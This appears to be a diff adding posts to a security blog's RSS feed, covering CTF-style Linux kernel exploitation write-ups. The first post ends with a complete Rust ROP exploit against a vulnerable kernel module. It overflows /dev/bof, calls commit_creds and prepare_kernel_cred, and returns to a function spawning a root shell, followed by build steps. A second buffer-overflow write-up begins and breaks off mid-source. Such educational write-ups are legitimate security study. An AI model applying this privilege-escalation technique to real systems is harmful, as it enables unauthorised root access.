+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Got root !!! Spawning shell...&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std::process::Command::new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .spawn().unwrap()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .wait().unwrap();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_cs&lt;/span&gt;() -&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; cs: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        asm!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push cs&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop {cs:e}&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out(reg) cs);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_eflags&lt;/span&gt;() -&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; eflags: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        asm!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pushf&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop {eflags:e}&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            eflags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out(reg) eflags);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    eflags
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_esp&lt;/span&gt;() -&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; esp: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        asm!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push esp&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop {esp:e}&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            esp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out(reg) esp);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    esp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_ss&lt;/span&gt;() -&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; ss: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        asm!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push ss&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop {ss:e}&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ss &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out(reg) ss);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ss
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt; OpenOptions::new()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .read(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .write(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/bof&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Ok(file) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; file,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Err(err) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; panic!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, err),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; commit_creds_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc1070e80&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; prepare_kernel_cred_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc10711f0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; g_pop_eax_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc1371479&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// pop eax,edx,ebx,esi,edi,ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; g_iret_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC101F504&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;.repeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(g_pop_eax_ea.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(&lt;span style=&#34;color:#ae81ff&#34;&gt;0_&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(prepare_kernel_cred_ea.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(commit_creds_ea.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(g_iret_ea.to_le_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; tf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; TrapFrame {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        eip: &lt;span style=&#34;color:#a6e22e&#34;&gt;spawn_shell&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; () &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        cs: &lt;span style=&#34;color:#a6e22e&#34;&gt;get_cs&lt;/span&gt;(),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        eflags: &lt;span style=&#34;color:#a6e22e&#34;&gt;get_eflags&lt;/span&gt;(),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        esp: &lt;span style=&#34;color:#a6e22e&#34;&gt;get_esp&lt;/span&gt;(),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ss:&lt;span style=&#34;color:#a6e22e&#34;&gt;get_ss&lt;/span&gt;() 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload.extend_from_slice(tf.to_bytes().as_ref());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@spawn_shell = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:p}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, spawn_shell &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; ());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ROP chain:&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; chunk &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; payload.chunks(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:04x}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;::from_le_bytes(chunk.try_into().unwrap())); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f.write_all(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;payload).unwrap();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to Rust building system, we can easely compile the exploit as a static binary for the target system:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir exploit &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cd exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cargo init .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cargo add libc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# copy code to src/main.rs&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# make sure target is available&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rustup target add i686-unknown-linux-musl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# build&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cargo build --target i686-unknown-linux-musl --release
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# then upload the binary to the target system&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# binary is found at ./target/i686-unknown-linux-musl/release/exploit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we run the binary and get a root shell !&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Got root&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/got-root.png&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Pwn: Linux Kernel x86 - Basic Buffer Overflow</title>
+      <link>//localhost:1313/posts/pwn-linkern-stack/</link>
+      <pubDate>Tue, 28 Jan 2025 12:00:00 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/pwn-linkern-stack/</guid>
+      <description>&lt;h1 id=&#34;pwn-linkern-x86---basic-buffer-overflow&#34;&gt;PWN: LinKern x86 - Basic Buffer Overflow&lt;/h1&gt;
+&lt;p&gt;We are tasked with exploiting an LKM that performs int to string conversions.&lt;/p&gt;
+&lt;p&gt;We have access to the source code of the LKM, simplifying the analysis.&lt;/p&gt;
+&lt;h2 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h2&gt;
+&lt;h3 id=&#34;lkm-initialization&#34;&gt;LKM initialization&lt;/h3&gt;
+&lt;p&gt;We first search for the functions tagged with &lt;code&gt;__init&lt;/code&gt; and &lt;code&gt;__exit&lt;/code&gt; maccros, which are later passed to the &lt;code&gt;module_init&lt;/code&gt; and &lt;code&gt;module_exit&lt;/code&gt; maccros and defines the LKM entry and exit points (called when loading/unloading the kernel module). These are the functions responsible for setting up/cleaning up the LKM interactions with the kernel (set up hooks, char devices, &amp;hellip;)&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;pwn-linkern-x86---basic-buffer-overflow&#34;&gt;PWN: LinKern x86 - Basic Buffer Overflow&lt;/h1&gt;
+&lt;p&gt;We are tasked with exploiting an LKM that performs int to string conversions.&lt;/p&gt;
+&lt;p&gt;We have access to the source code of the LKM, simplifying the analysis.&lt;/p&gt;
+&lt;h2 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h2&gt;
+&lt;h3 id=&#34;lkm-initialization&#34;&gt;LKM initialization&lt;/h3&gt;
+&lt;p&gt;We first search for the functions tagged with &lt;code&gt;__init&lt;/code&gt; and &lt;code&gt;__exit&lt;/code&gt; maccros, which are later passed to the &lt;code&gt;module_init&lt;/code&gt; and &lt;code&gt;module_exit&lt;/code&gt; maccros and defines the LKM entry and exit points (called when loading/unloading the kernel module). These are the functions responsible for setting up/cleaning up the LKM interactions with the kernel (set up hooks, char devices, &amp;hellip;)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; __init &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_init&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;/* Constructor */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring registered&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  tostring.pointer&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  tostring.tostring_read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_read_hexa;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;alloc_chrdev_region&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;first, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tostring&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
